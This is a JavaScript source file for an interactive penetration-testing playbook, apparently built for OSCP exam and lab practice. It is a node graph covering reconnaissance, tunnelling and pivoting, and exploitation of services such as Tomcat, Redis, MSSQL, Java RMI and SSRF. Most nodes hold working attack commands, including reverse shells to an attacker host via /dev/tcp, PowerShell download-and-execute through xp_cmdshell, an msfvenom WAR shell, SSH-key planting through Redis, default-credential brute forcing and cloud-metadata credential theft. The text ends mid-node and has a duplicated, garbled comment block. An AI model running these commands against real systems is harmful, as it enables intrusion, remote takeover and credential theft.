import { useState, useEffect, useRef } from "react";

// ─────────────────────────────────────────────
//  NODE GRAPH
// ─────────────────────────────────────────────
const nodes = {

  // ==========================================
  //  START
  // ==========================================
  start: {
    phase: "RECON",
    title: "Engagement Start",
    body: "Set your variables first — every command references them. What is your current situation?",
    cmd: `export ip=10.10.10.10
export subnet=192.168.185.0/24
export lhost=10.10.14.x
export lport=443
export domain=domain.com

mkdir -p ~/results/$ip/{scans,exploits,loot,screenshots,tunnels}
cd ~/results/$ip`,
    warn: null,
    choices: [
      { label: "Single target IP — full port scan", next: "full_portscan" },
      { label: "Subnet — need to find live hosts first", next: "host_discovery" },
      { label: "Got a shell — need to pivot deeper", next: "pivot_start" },
      { label: "Documentation — ATT&CK structured notes", next: "reporting" },
      { label: "Documentation — Report writing", next: "report_writing" },
      { label: "I am stuck / spinning / losing time", next: "mindset_stuck" },
      { label: "Pre-exam setup — before the clock starts", next: "mindset_preexam" },
      { label: "Jump to technique — skip the flow", next: "jump_menu" },
    ],
  },


  // ==========================================
  //  JUMP MENU — DIRECT TECHNIQUE ACCESS
  // ==========================================

  jump_menu: {
    phase: "JUMP",
    title: "Jump to Technique",
    body: "Direct access to any section. Use this for labs, CTFs, or when you already know what you are dealing with and need the technique fast.",
    cmd: `# No commands here — pick your domain`,
    warn: null,
    choices: [
      { label: "Web attacks", next: "jump_web" },
      { label: "SQL injection", next: "jump_sqli" },
      { label: "Shells & payloads", next: "jump_shells" },
      { label: "File transfer & exfil", next: "transfer_agnostic" },
      { label: "Linux privesc", next: "jump_linux" },
      { label: "Windows privesc", next: "jump_windows" },
      { label: "Active Directory", next: "jump_ad" },
      { label: "Services & ports", next: "jump_services" },
      { label: "Windows persistence", next: "persistence" },
      { label: "LOLBins — Windows built-in abuse", next: "lolbins" },
      { label: "GTFOBins — Linux built-in abuse", next: "gtfobins_linux" },
      { label: "Password attacks hub", next: "password_attacks" },
      { label: "HTTP password brute force", next: "bruteforce" },
      { label: "Scan notes — document findings", next: "scan_notes" },
      { label: "Version # danger reference", next: "version_ref" },
      { label: "Pivoting & tunnels", next: "jump_pivot" },
      { label: "Documentation & reporting", next: "reporting" },
      { label: "Back to start", next: "start" },
    ],
  },

  scan_notes: {
    phase: "RECON",
    title: "Engagement Scan Notes",
    body: "Fill this in as you read nmap output. One row per interesting port. This is your attack surface map — build it before you touch anything.",
    cmd: `# -- SCAN NOTES TEMPLATE ------------------------------
# Target: $ip
# OS:     [Windows / Linux — TTL: ~128=Win, ~64=Lin]
# Date:   [date]
#
# PORT    SERVICE         VERSION                 NOTES
# ----------------------------------------------------
# 21      ftp             vsftpd x.x              [anon? writable?]
# 22      ssh             OpenSSH x.x             [version vuln?]
# 80      http            Apache x.x              [app? CMS?]
# 139     netbios-ssn     Samba x.x               [null session?]
# 443     https           nginx x.x               [cert hostname?]
# 445     microsoft-ds    Windows x               [signing? EB?]
# 1978    unknown         luminateOK              [banner + google]
# 3306    mysql           MySQL x.x               [creds?]
# 8080    http            Tomcat x.x              [manager?]
#
# Highest value port:  [fill in]
# Attack path:         [fill in]
# Creds found:         [fill in]
#
# -- BANNER GRAB unknown ports -------------------------
nc -nv $ip <PORT>
curl -sv http://$ip:<PORT>

# -- TTL OS fingerprint --------------------------------
ping -c 1 $ip | grep ttl
# TTL ~128 = Windows  /  TTL ~64 = Linux

# -- Feed nmap XML to searchsploit ---------------------
nmap -sV -oX nmap.xml $ip
searchsploit --nmap nmap.xml`,
    warn: "Unknown ports with banners are often the intended path. If nmap shows unrecognized service, banner grab manually and google the string. luminateOK = WiFi Mouse / Remote Mouse — searchsploit it.",
    choices: [
      { label: "Got versions — check danger reference", next: "version_ref" },
      { label: "Unknown service — banner grab it", next: "unknown_service" },
      { label: "Ready to attack", next: "targeted_scan" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  version_ref: {
    phase: "RECON",
    title: "Service Version Danger Reference",
    body: "Match port + service + version to this table. Anything on the danger list — searchsploit immediately. Anything unknown — searchsploit anyway.",
    cmd: `# -- PORT / SERVICE / DANGER VERSION / IMPACT ---------
#
# PORT   SERVICE         DANGER VERSION        IMPACT
# --------------------------------------------------------
# 21     vsftpd          2.3.4                 backdoor root shell
# 21     ProFTPD         1.3.3c                backdoor root shell
# 21     ProFTPD         1.3.x IAC             RCE via SITE EXEC
# 22     OpenSSH         < 7.7                 username enum (CVE-2018-15473)
# 22     OpenSSH         2.x / 3.x             direct exploits likely
# 25     SMTP            any                   user enum via VRFY/EXPN
# 80     Apache          2.4.49                path traversal RCE
# 80     Apache          2.4.50                path traversal RCE
# 80     Apache          2.2.x                 many vulns — searchsploit
# 80     IIS             6.0                   ScStoragePathFromUrl RCE
# 80     Tomcat          any                   manager upload WAR shell
# 139    Samba           3.0.20-3.0.25rc3      usermap_script RCE
# 139    Samba           3.5.0-4.4.13          is_known_pipename RCE
# 443    OpenSSL         1.0.1-1.0.1f          Heartbleed
# 445    SMB             WinXP/2003            MS08-067 SYSTEM
# 445    SMB             Win7/2008             MS17-010 EternalBlue SYSTEM
# 512    rexec           any                   exec as root if misconfigured
# 513    rlogin          any                   no password if .rhosts
# 1099   Java RMI        any                   deserialization RCE
# 1978   WiFi Mouse      any                   unauth RCE (CVE-2021-35448)
# 2049   NFS             any                   mountable share
# 3306   MySQL           any                   UDF exploit / file read
# 3632   distccd         any                   RCE as daemon
# 5432   PostgreSQL      any                   COPY TO PROGRAM RCE
# 5900   VNC             any                   try no/default password
# 6379   Redis           any                   unauth RCE via config
# 8009   Tomcat AJP      < 9.0.31              Ghostcat file read
# 8080   Jenkins         any                   Groovy console RCE
# 27017  MongoDB         any                   unauth data dump
# --------------------------------------------------------

# -- SEARCHSPLOIT WORKFLOW -----------------------------
searchsploit vsftpd 2.3.4
searchsploit openssh 7.2
searchsploit samba 3.0
searchsploit apache 2.4
searchsploit apache | grep -v '/dos/'
searchsploit --nmap nmap.xml
searchsploit -m <path/to/exploit>
searchsploit -x <path/to/exploit>`,
    warn: "Always read the exploit before running — check target IP/port variables and Python version. A wrong IP in a buffer overflow crashes the target.",
    choices: [
      { label: "Found matching exploit — fix and run", next: "exploit_fix_web" },
      { label: "Found buffer overflow exploit", next: "bof" },
      { label: "Back to nmap analysis", next: "analyze_output" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_web: {
    phase: "JUMP",
    title: "Web Attacks — Jump Menu",
    body: "Pick the technique directly.",
    cmd: `# Web attack reference`,
    warn: null,
    choices: [
      { label: "Web enumeration (gobuster/feroxbuster/nikto)", next: "web_enum" },
      { label: "Deep fuzzing / parameter brute force", next: "web_fuzz_deep" },
      { label: "Parameter found — test it", next: "param_found" },
      { label: "SQL injection", next: "jump_sqli" },
      { label: "File upload bypass", next: "file_upload" },
      { label: "LFI → RCE chain", next: "lfi" },
      { label: "SSRF", next: "ssrf" },
      { label: "SSTI — template injection", next: "ssti" },
      { label: "XXE", next: "xxe" },
      { label: "XSS", next: "xss" },
      { label: "IDOR", next: "idor" },
      { label: "Command injection", next: "cmd_injection" },
      { label: "WordPress", next: "wordpress" },
      { label: "SSTI — template injection", next: "ssti" },
      { label: "Login page — brute / bypass", next: "login_page" },
      { label: "HTTP password brute force", next: "bruteforce" },
      { label: "Subdomain enumeration", next: "subdomain_enum" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_sqli: {
    phase: "JUMP",
    title: "SQL Injection — Jump Menu",
    body: "Pick by injection type or workflow stage.",
    cmd: `# SQLi reference index`,
    warn: null,
    choices: [
      { label: "Detection — identify injection type", next: "sqli_test" },
      { label: "Error-based extraction", next: "sqli_error" },
      { label: "UNION-based extraction", next: "sqli_union" },
      { label: "Blind boolean extraction", next: "sqli_blind" },
      { label: "Time-based blind", next: "sqli_time" },
      { label: "WAF evasion", next: "sqli_waf" },
      { label: "sqlmap full escalation", next: "sqli_sqlmap" },
      { label: "SQLi → shell (INTO OUTFILE / xp_cmdshell)", next: "sqli_shell" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_shells: {
    phase: "JUMP",
    title: "Shells & Payloads — Jump Menu",
    body: "Listener setup, payload generation, shell stabilization, troubleshooting.",
    cmd: `# Shell reference index`,
    warn: null,
    choices: [
      { label: "Catch a reverse shell", next: "reverse_shell" },
      { label: "Shell not catching — troubleshoot", next: "shell_troubleshoot" },
      { label: "Bind shell (outbound filtered)", next: "shell_bind" },
      { label: "Meterpreter — setup and usage", next: "shell_meterpreter" },
      { label: "Upgrade dumb shell to full TTY", next: "shell_upgrade" },
      { label: "Buffer overflow (Windows x86)", next: "bof" },
      { label: "Client-side attacks", next: "client_side" },
      { label: "AMSI / AV bypass", next: "amsi_bypass" },
      { label: "File transfer — get tools on target", next: "file_transfer" },
      { label: "Transfer — Agnostic / any OS", next: "transfer_agnostic" },
      { label: "Transfer — Windows", next: "transfer_windows" },
      { label: "Transfer — Linux", next: "transfer_linux" },
      { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_linux: {
    phase: "JUMP",
    title: "Linux Privesc — Jump Menu",
    body: "Pick the vector directly.",
    cmd: `# Linux privesc reference`,
    warn: null,
    choices: [
      { label: "Quick enum reference — one-liners", next: "linux_enum_quick" },
      { label: "Initial foothold — full enum flow", next: "linux_post_exploit" },
      { label: "LinPEAS — automated enum", next: "linpeas" },
      { label: "sudo -l — quickest win", next: "sudo_check" },
      { label: "SUID binaries / capabilities", next: "suid_check" },
      { label: "Cron jobs", next: "cron_check" },
      { label: "/etc/passwd or /etc/shadow abuse", next: "passwd_shadow" },
      { label: "Groups — docker/lxd/disk/PATH hijack", next: "linux_privesc_extra" },
      { label: "Password hunting — files/history/configs", next: "linux_password_hunt" },
      { label: "Capabilities / NFS / writable files", next: "linux_manual_enum" },
      { label: "GTFOBins — Linux LOLBins reference", next: "gtfobins_linux" },
      { label: "Kernel exploit", next: "kernel_exploit" },
      { label: "Got root — loot and persist", next: "got_root_linux" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_windows: {
    phase: "JUMP",
    title: "Windows Privesc — Jump Menu",
    body: "Pick the vector directly.",
    cmd: `# Windows privesc reference`,
    warn: null,
    choices: [
      { label: "Initial foothold — orient and enumerate", next: "windows_post_exploit" },
      { label: "Quick enum reference — one-liners", next: "windows_enum_quick" },
      { label: "WinPEAS — automated enum", next: "winpeas" },
      { label: "Token impersonation (Potato attacks)", next: "token_privs" },
      { label: "Unquoted service path", next: "unquoted_service" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "Compile Windows payloads (mingw/msfvenom)", next: "win_compile" },
      { label: "AlwaysInstallElevated", next: "always_install_elevated" },
      { label: "Scheduled Tasks privesc", next: "scheduled_tasks_win" },
      { label: "Credential hunting (registry/files/SAM)", next: "windows_creds" },
      { label: "Pass the Hash", next: "pth" },
      { label: "DPAPI credential extraction", next: "dpapi" },
      { label: "Manual enum (tasks/DLL/UAC)", next: "windows_post_exploit" },
      { label: "Scheduled task exploitation", next: "scheduled_tasks_win" },
      { label: "DLL hijacking", next: "win_dll_hijack" },
      { label: "UAC bypass", next: "win_uac_bypass" },
      { label: "AMSI / AV bypass", next: "amsi_bypass" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_ad: {
    phase: "JUMP",
    title: "Active Directory — Jump Menu",
    body: "Pick the AD technique directly.",
    cmd: `# AD reference index`,
    warn: null,
    choices: [
      { label: "AD entry — assumed breach", next: "ad_start" },
      { label: "BloodHound — run and read", next: "bloodhound" },
      { label: "Responder / LLMNR poisoning", next: "responder" },
      { label: "AS-REP roasting", next: "asrep_roast" },
      { label: "Kerberoasting", next: "kerberoast" },
      { label: "Password spraying", next: "ad_spray" },
      { label: "ACL abuse (GenericAll/WriteDACL)", next: "acl_abuse" },
      { label: "Delegation attacks", next: "delegation" },
      { label: "AD Certificate Services (ESC1/ESC4)", next: "adcs" },
      { label: "DCSync — domain owned", next: "dcsync" },
      { label: "Lateral movement (PtH/WinRM/SMB)", next: "lateral_movement" },
      { label: "Manual enum — BloodHound dead end", next: "ad_manual" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_services: {
    phase: "JUMP",
    title: "Services & Ports — Jump Menu",
    body: "Jump directly to a service. Same as unknown_service but organized by category.",
    cmd: `# Service reference index`,
    warn: null,
    choices: [
      { label: "Web (HTTP/HTTPS) — full enum", next: "web_enum" },
      { label: "SMB (445)", next: "smb_enum" },
      { label: "FTP (21)", next: "ftp_enum" },
      { label: "SSH (22)", next: "ssh_only" },
      { label: "RDP (3389)", next: "rdp" },
      { label: "WinRM (5985)", next: "winrm_access" },
      { label: "MySQL (3306)", next: "mysql" },
      { label: "MSSQL (1433)", next: "mssql" },
      { label: "PostgreSQL (5432)", next: "postgres" },
      { label: "MongoDB (27017)", next: "mongodb" },
      { label: "Redis (6379)", next: "redis" },
      { label: "NFS (2049)", next: "nfs_enum" },
      { label: "DNS (53)", next: "dns_enum" },
      { label: "SMTP (25/587)", next: "smtp_enum" },
      { label: "Tomcat / Java", next: "tomcat" },
      { label: "Jenkins", next: "jenkins" },
      { label: "Grafana (3000)", next: "grafana" },
      { label: "Splunk (8000/8089)", next: "splunkd" },
      { label: "Docker API (2375)", next: "docker_api" },
      { label: "Elasticsearch (9200)", next: "elasticsearch" },
      { label: "Port knocking", next: "port_knocking" },
      { label: "Credential reuse — spray everywhere", next: "cred_reuse" },
      { label: "File transfer — get tools on target", next: "file_transfer" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  jump_pivot: {
    phase: "JUMP",
    title: "Pivoting & Tunnels — Jump Menu",
    body: "Jump directly to a tunneling technique.",
    cmd: `# Pivot reference index`,
    warn: null,
    choices: [
      { label: "Pivot strategy — map the network", next: "pivot_start" },
      { label: "Ligolo-ng tunnel", next: "ligolo" },
      { label: "SSH tunnel / SOCKS proxy", next: "ssh_tunnel" },
      { label: "Chisel tunnel", next: "chisel" },
      { label: "Manual socat / netsh port forward", next: "manual_portfwd" },
      { label: "Double pivot — chain through two hosts", next: "double_pivot" },
      { label: "Internal host discovery (post-pivot)", next: "pivot_discovery" },
      { label: "Port scan through tunnel", next: "pivot_portscan" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  host_discovery: {
    phase: "DISCOVERY",
    title: "Host Discovery",
    body: "Run all methods in parallel. ARP cannot be blocked on the local subnet — most reliable method. ICMP gets filtered constantly. Merge everything into one list.",
    cmd: `sudo nmap -sn $subnet -oG scan.txt
grep Up scan.txt | cut -d " " -f 2 > ips_nmap.txt

sudo arp-scan $subnet | tee arp.txt

fping -a -g $subnet 2>/dev/null | tee fping.txt

cat ips_nmap.txt fping.txt | sort -u | grep -v "^$" > live_hosts.txt
cat live_hosts.txt`,
    warn: "ARP only works on your local subnet. Through a tunnel ARP is gone — use ICMP and TCP probes only.",
    choices: [
      { label: "Have host list — mass port scan", next: "mass_portscan" },
      { label: "One interesting host — deep scan it", next: "full_portscan" },
    ],
  },

  mass_portscan: {
    phase: "DISCOVERY",
    title: "Mass Port Scan",
    body: "Scan the full live host list. Grep for high-value ports to triage targets fast.",
    cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt
grep "open" mass_scan.txt

rustscan -a live_hosts.txt -- -sC -sV -oN rustscan.txt

grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
    warn: null,
    choices: [
      { label: "Found web target", next: "web_enum" },
      { label: "Found SMB target", next: "smb_enum" },
      { label: "Found Windows (RDP/WinRM)", next: "windows_post_exploit" },
      { label: "Found AD/DC", next: "ad_start" },
      { label: "Single target — targeted scan", next: "targeted_scan" },
    ],
  },

  pivot_start: {
    phase: "PIVOT",
    title: "Pivot — Map the Network",
    body: "You have a foothold. Map what subnets this machine can reach before building any tunnel. The routing table and ARP cache tell you everything.",
    cmd: `ip a && ip route && arp -a && cat /etc/hosts && ss -tulpn

ipconfig /all && route print && arp -a && netstat -ano

export pivot_subnet=172.16.50.0/24`,
    warn: "Map the full network BEFORE building your tunnel. You need the target subnet first.",
    choices: [
      { label: "Linux pivot — Ligolo-ng tunnel", next: "ligolo" },
      { label: "Windows pivot — Ligolo-ng tunnel", next: "ligolo" },
      { label: "SSH creds to pivot — SSH tunnel", next: "ssh_tunnel" },
      { label: "Cannot upload tools — socat/netsh", next: "manual_portfwd" },
    ],
  },

  ligolo: {
    phase: "PIVOT",
    title: "Ligolo-ng Tunnel",
    body: "Cleanest tunnel for OSCP. Proxy on Kali, agent on pivot. Once running your Kali tools hit internal hosts directly — no proxychains needed.",
    cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Linux pivot:   ./agent -connect $lhost:11601 -ignore-cert
# Windows pivot: .\\agent.exe -connect $lhost:11601 -ignore-cert

session
[select number]
start

sudo ip route add $pivot_subnet dev ligolo
ping 172.16.50.1`,
    warn: "Add the route AFTER the tunnel starts. Without the route traffic does not flow.",
    choices: [
      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
      { label: "Tunnel up — scan known internal target", next: "pivot_portscan" },
      { label: "Need to chain through another pivot", next: "double_pivot" },
    ],
  },

  ssh_tunnel: {
    phase: "PIVOT",
    title: "SSH Tunnel",
    body: "SSH creds to the pivot means no binary uploads needed. Dynamic -D gives a full SOCKS5 proxy for proxychains.",
    cmd: `ssh -D 1080 -N -f user@$ip
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 80,443,445 172.16.50.0/24

ssh -L 8080:172.16.50.5:80 user@$ip -N
curl http://localhost:8080

ssh -R 4444:127.0.0.1:4444 user@$ip -N

ssh -J user@$ip user2@172.16.50.5`,
    warn: "proxychains + nmap: always -sT. Never -sS through SOCKS — it will hang.",
    choices: [
      { label: "SOCKS proxy up — discover internal hosts", next: "pivot_discovery" },
      { label: "Port forward set — scan specific service", next: "pivot_portscan" },
    ],
  },

  manual_portfwd: {
    phase: "PIVOT",
    title: "Manual Port Forward",
    body: "No binary uploads possible. socat on Linux, netsh on Windows. One port at a time.",
    cmd: `socat TCP-LISTEN:8080,fork TCP:172.16.50.5:80 &

netsh interface portproxy add v4tov4 \\
  listenaddress=0.0.0.0 listenport=8080 \\
  connectaddress=172.16.50.5 connectport=80
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 \\
  listenaddress=0.0.0.0 listenport=8080

iptables -t nat -A PREROUTING -p tcp --dport 8080 \\
  -j DNAT --to-destination 172.16.50.5:80
iptables -t nat -A POSTROUTING -j MASQUERADE`,
    warn: null,
    choices: [
      { label: "Port forwarded — access service on Kali", next: "web_enum" },
      { label: "Need full network access — try Chisel", next: "chisel" },
    ],
  },

  chisel: {
    phase: "PIVOT",
    title: "Chisel Tunnel",
    body: "Chisel runs over HTTP — works when direct TCP is blocked by firewall. Server on Kali, client on pivot.",
    cmd: `./chisel server -p 8080 --reverse --socks5

./chisel client $lhost:8080 R:socks
.\\chisel.exe client $lhost:8080 R:socks

proxychains nmap -sT -p- 172.16.50.5

./chisel client $lhost:8080 R:3306:172.16.50.5:3306`,
    warn: "proxychains + nmap: always -sT. UDP and ICMP do not traverse SOCKS.",
    choices: [
      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
      { label: "Tunnel up — scan internal target", next: "pivot_portscan" },
    ],
  },

  pivot_discovery: {
    phase: "PIVOT",
    title: "Internal Host Discovery",
    body: "You are on a routed network now — ARP is gone. ICMP and TCP probes only. Through Ligolo scan directly. Through proxychains use -sT and drop the rate.",
    cmd: `sudo nmap -sn $pivot_subnet -oG pivot_scan.txt
grep Up pivot_scan.txt | cut -d " " -f 2 > pivot_hosts.txt
fping -a -g $pivot_subnet 2>/dev/null >> pivot_hosts.txt

proxychains nmap -sT -sn $pivot_subnet --min-rate 200

for i in $(seq 1 254); do
  ping -c1 -W1 172.16.50.$i &>/dev/null && echo "172.16.50.$i" &
done; wait

for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.50.%i | findstr "TTL"

sort -u pivot_hosts.txt > internal_live.txt`,
    warn: "Max --min-rate 200 through proxychains. Higher rates drop packets.",
    choices: [
      { label: "Found internal hosts — port scan them", next: "pivot_portscan" },
      { label: "Found AD / DC", next: "ad_start" },
      { label: "Found another subnet — double pivot", next: "double_pivot" },
    ],
  },

  pivot_portscan: {
    phase: "PIVOT",
    title: "Port Scan Through Tunnel",
    body: "Ligolo: treat like a direct connection. Proxychains: -sT required, lower rate. Never -sS through SOCKS.",
    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN pivot_allports.txt
nmap -p <PORTS> -sC -sV 172.16.50.5 -oN pivot_targeted.txt

proxychains nmap -sT -p 80,443,445,22,3389,5985,1433,3306 \\
  172.16.50.5 --open -T2
proxychains curl -sv http://172.16.50.5

for host in $(cat internal_live.txt); do
  nmap -p 80,443,445,22,3389,5985,8080 \\
    --open $host -oN pivot_$host.txt
done`,
    warn: "Never -sS through proxychains. Always -sT.",
    choices: [
      { label: "Found internal web", next: "web_enum" },
      { label: "Found internal SMB", next: "smb_enum" },
      { label: "Found internal AD / DC", next: "ad_start" },
      { label: "Found another pivot layer", next: "double_pivot" },
      { label: "Full service enum", next: "targeted_scan" },
    ],
  },

  double_pivot: {
    phase: "PIVOT",
    title: "Double Pivot",
    body: "Three-hop chain: Kali to Pivot1 to Pivot2 to Target. Chain Ligolo listeners or nest SSH tunnels. Draw the map first.",
    cmd: `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

./agent -connect 172.16.50.X:11601 -ignore-cert

session
[select pivot2]
start

sudo ip route add 10.10.10.0/24 dev ligolo

ssh -D 1080 user@pivot1 -N &
proxychains ssh -D 1081 user@172.16.50.X -N &`,
    warn: "Every hop adds latency. Drop scan rates further with each layer.",
    choices: [
      { label: "Double pivot up — discover third network", next: "pivot_discovery" },
      { label: "Reached target — enumerate it", next: "targeted_scan" },
    ],
  },

  unknown_service: {
    phase: "RECON",
    title: "Unknown Service / Port",
    body: "nmap gave you a port you don't recognize. Banner grab first, then version-specific research. Every service has a fingerprint.",
    cmd: `nc -nv $ip <PORT>
curl -sv http://$ip:<PORT>
curl -sv https://$ip:<PORT>

nmap -p <PORT> -sC -sV --version-intensity 9 $ip

# Common high-port services:
# 8080/8443/8009 — Tomcat, JBoss, GlassFish
# 9200/9300     — Elasticsearch
# 6379          — Redis
# Common high-port services:
# 8080/8443/8009 — Tomcat, JBoss, GlassFish
# 9200/9300     — Elasticsearch
# 6379          — Redis
# 27017         — MongoDB
# 2181          — Zookeeper → look for Exhibitor UI on 8080/8081 → CVE-2019-5029
# 8080/8081     — Exhibitor Web UI (no auth) → command injection → shell
# 17001         — MS .NET Remoting (SmarterMail RCE — CVE-2019-7214)
# GoAhead-Webs  — Embedded/industrial mgmt software → old CVEs → searchsploit
#                 HP Power Manager: admin:admin → buffer overflow → SYSTEM
# HP Power Mgr  — port 80, GoAhead WebServer, admin:admin, MSF exploit
# 9998          — SmarterMail web UI (check version here)
# NOTE: .NET remoting exploit port ≠ web UI port — use remoting portngoDB
# 1433          — MSSQL
# 1099          — Java RMI
# 5432          — PostgreSQL
# 11211         — Memcached
# 2181          — ZooKeeper
# 4848          — GlassFish admin

searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')`,
    warn: null,
    choices: [
      { label: "Tomcat / JBoss / Java app server", next: "tomcat" },
      { label: "Redis (6379)", next: "redis" },
      { label: "MSSQL (1433)", next: "mssql" },
      { label: "PostgreSQL (5432)", next: "postgres" },
      { label: "MongoDB (27017)", next: "mongodb" },
      { label: "MySQL (3306)", next: "mysql" },
      { label: "NFS (2049)", next: "nfs_enum" },
      { label: "Rsync (873)", next: "rsync" },
      { label: "SMTP (25/587)", next: "smtp_enum" },
      { label: "Elasticsearch (9200)", next: "elasticsearch" },
      { label: "Docker API (2375/2376)", next: "docker_api" },
      { label: "VNC (5900)", next: "vnc" },
      { label: "DNS (53)", next: "dns_enum" },
      { label: "Grafana (3000)", next: "grafana" },
      { label: "Splunk (8000/8089)", next: "splunkd" },
      { label: "Memcached (11211)", next: "memcached" },
      { label: "Java RMI (1099)", next: "java_rmi" },
      { label: "Web interface found", next: "web_enum" },
      { label: "Searchsploit hit", next: "searchsploit_web" },
    ],
  },

  tomcat: {
    phase: "WEB",
    title: "Apache Tomcat",
    body: "Manager console upload is the classic path. Default creds are shockingly common. AJP connector (8009) enables Ghostcat if exposed.",
    cmd: `# Manager console
http://$ip:8080/manager/html
http://$ip:8080/host-manager/html

# Default creds to try:
# tomcat:tomcat   tomcat:s3cret   admin:admin
# admin:tomcat    manager:manager  both:both

# Brute force manager
hydra -L /opt/SecLists/Usernames/tomcat-usernames.txt \\
  -P /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \\
  http-get://$ip:8080/manager/html

# Once in — deploy malicious WAR
msfvenom -p java/jsp_shell_reverse_tcp \\
  LHOST=$lhost LPORT=$lport -f war -o shell.war
# Upload via Manager > Deploy > WAR file
# Access: http://$ip:8080/shell/

# Ghostcat CVE-2020-1938 (AJP port 8009)
python3 ghostcat.py -p 8009 $ip`,
    warn: null,
    choices: [
      { label: "WAR deployed — got shell", next: "shell_upgrade" },
      { label: "Ghostcat file read — found creds", next: "creds_found" },
      { label: "No manager access", next: "searchsploit_web" },
    ],
  },

  redis: {
    phase: "RECON",
    title: "Redis (6379)",
    body: "Unauthenticated Redis is often RCE. Write SSH keys, cron jobs, or webshells depending on what Redis can reach.",
    cmd: `redis-cli -h $ip ping
redis-cli -h $ip info

# If authenticated — try default passwords
redis-cli -h $ip -a ""
redis-cli -h $ip -a "redis"
redis-cli -h $ip -a "password"

# RCE via authorized_keys
redis-cli -h $ip config set dir /root/.ssh
redis-cli -h $ip config set dbfilename authorized_keys
redis-cli -h $ip set payload "\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n"
redis-cli -h $ip save

# RCE via cron (if /var/spool/cron writable)
redis-cli -h $ip config set dir /var/spool/cron
redis-cli -h $ip config set dbfilename root
redis-cli -h $ip set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$lhost/$lport 0>&1\\n\\n"
redis-cli -h $ip save`,
    warn: "Check what user Redis runs as before choosing your attack path.",
    choices: [
      { label: "SSH key write — got root shell", next: "got_root_linux" },
      { label: "Cron job — got shell", next: "shell_upgrade" },
      { label: "Authenticated — needs password", next: "bruteforce" },
    ],
  },

  mssql: {
    phase: "RECON",
    title: "MSSQL (1433)",
    body: "MSSQL with xp_cmdshell enabled is instant RCE. SA account with default creds is common. impacket-mssqlclient handles everything.",
    cmd: `impacket-mssqlclient sa:''@$ip
impacket-mssqlclient sa:'sa'@$ip
impacket-mssqlclient sa:'password'@$ip -windows-auth

# Once connected:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"

# If xp_cmdshell disabled — enable it
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Read files
SQL> BULK INSERT tmp FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts' WITH (ROWTERMINATOR='\\n');
SQL> SELECT * FROM tmp;`,
    warn: null,
    choices: [
      { label: "xp_cmdshell RCE — get reverse shell", next: "reverse_shell" },
      { label: "Got creds from DB", next: "creds_found" },
      { label: "Need creds", next: "bruteforce" },
    ],
  },

  java_rmi: {
    phase: "RECON",
    title: "Java RMI (1099)",
    body: "Exposed Java RMI registry is often exploitable via deserialization. ysoserial generates payloads for common gadget chains.",
    cmd: `nmap -p 1099 --script rmi-dumpregistry $ip
nmap -p 1099 --script rmi-vuln-classloader $ip

# Enumerate RMI registry
rmg enum $ip 1099

# ysoserial payload generation
# Find the right gadget chain — try CommonsCollections first
java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$lhost/$lport,0>&1}' | \\
  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $ip 1099 CommonsCollections6 \\
  'bash -c {bash,-i,>&,/dev/tcp/$lhost/$lport,0>&1}'

# remote-method-guesser (rmg) for modern exploitation
rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$lhost/$lport<&1'`,
    warn: "Gadget chain depends on classpath — try CommonsCollections1-7, Spring, Groovy.",
    choices: [
      { label: "Got shell via deserialization", next: "shell_upgrade" },
      { label: "Registry accessible — searchsploit version", next: "searchsploit_web" },
    ],
  },

  ssrf: {
    phase: "WEB",
    title: "SSRF",
    body: "Pivot through the web app to reach internal services. Time-based internal port scanning is reliable. Cloud metadata is a bonus prize.",
    cmd: `nc -nlvp 80

curl "http://$ip/page?url=http://$lhost/"
curl "http://$ip/page?url=http://127.0.0.1/"
curl "http://$ip/page?url=http://169.254.169.254/"

# Internal port scan via timing
for port in 22 80 443 445 3306 5432 6379 8080 8443; do
  echo -n "$port: "
  time curl -so /dev/null "http://$ip/page?url=http://127.0.0.1:$port/"
done

# Cloud metadata
curl "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# File read
curl "http://$ip/page?url=file:///etc/passwd"
curl "http://$ip/page?url=gopher://127.0.0.1:25/"`,
    warn: null,
    choices: [
      { label: "Reached internal service", next: "pivot_portscan" },
      { label: "Cloud metadata creds", next: "creds_found" },
      { label: "File read working — LFI path", next: "lfi" },
    ],
  },

  ssti: {
    phase: "WEB",
    title: "SSTI — Template Injection",
